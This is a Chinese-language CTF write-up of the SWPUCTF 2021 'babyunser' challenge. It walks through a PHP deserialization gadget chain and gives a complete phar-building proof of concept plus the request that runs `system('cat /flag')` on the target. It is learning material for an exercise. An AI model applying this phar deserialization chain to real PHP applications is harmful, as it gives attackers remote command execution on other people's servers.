---
title: "Web 15 [SWPUCTF 2021 新生赛]babyunser"
published: 2026-02-20
category: CTF
---

![](https://pic.npiter.de/file/1771551871192_20260220094427165.png)

这道题主要是学习师傅的 WP，对于反序列化还完全不懂。

打开题目：

![](https://pic.npiter.de/file/1771551876458_20260220094427166.png)

可以上传和查看搜索文件。

**核心**：调用的是 xx 类的 `__call` 方法，通过此方法构造恶意函数进而执行我们传入的命令。

## 反序列化链分析

以下全当学习，照着师傅的 WP 做的。

**链子的起点是 aa 类：**

```php
$a = new aa(); // new 一个 aa 类的对象
```

aa 类的 `__destruct` 方法中用了 `strtolower` 函数，参数是属性 `name`。我们将其设为 zz 类的对象，对象被当成字符串从而触发 zz 类的 `__toString` 方法：

```php
$a->name = new zz(); // 将 name 属性赋值为 zz 类的对象
```

**在 zz 类的 `__toString` 方法中：**

```php
$this->{$_POST['method']}($_POST['var']);
```

这行代码调用 zz 类中的一个函数，函数名和参数都需要 POST 传入。

让它调用 zz 类的 `write` 函数，参数设为 `content`，所以 POST 传参：

```
method=write&var=content
```

代码等价于：

```php
$this->write('content')
```

**进入 zz 类的 write 函数：**

```php
$lt = $this->filename->$var
```

将当前类的 `filename` 属性赋值给变量 `var` 属性，这里的 `$var` 就是我们传入的 `content`。

我们将 `filename` 属性赋值为 ff 类的对象，相当于访问 ff 类中的 `content` 属性。但 ff 类的 `content` 是私有属性，外部访问会触发 ff 类的 `__get` 方法：

```php
$a->name->filename = new ff(); // 将 filename 属性赋值为 ff 类的对象
```

**在 ff 类的 `__get` 方法中：**

传入的参数 `key` 是 `content`，内部代码相当于：

```php
$this->content->{$this->func}($_POST['cmd']);
```

如果将 `func` 赋值为 `system`，`cmd` 赋值为 `cat /flag`，但 `content` 还没有赋值，无法直接调用 `system` 方法。

**所以 ff 类的 `__get` 不是链子终点。**

将 ff 类的 `content` 属性赋值为 xx 类的对象。调用 xx 类中不存在的方法 `system`，触发 xx 类的 `__call` 方法：

```php
__call('system', 'cat /flag')
```

在 `__call` 函数内部：

```php
$name($arg[0]);
// 等价于
system('cat /flag')
```

**链子结束！**

## 最终 POC

```php
<?php
class aa {
    public $name;
}
class ff {
    public $func;
    public $content;
}
class zz {
    public $filename;
    public $content;
}
class xx {
    public $name;
    public $arg;
}

$a = new aa();
$a->name = new zz();
$a->name->filename = new ff();
$a->name->filename->content = new xx();
$a->name->filename->func = "system";

$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

发送请求：

```
file=phar://upload/你的文件.txt&method=write&var=content&cmd=cat /flag
```

![](https://pic.npiter.de/file/1771551884066_20260220094427167.png)
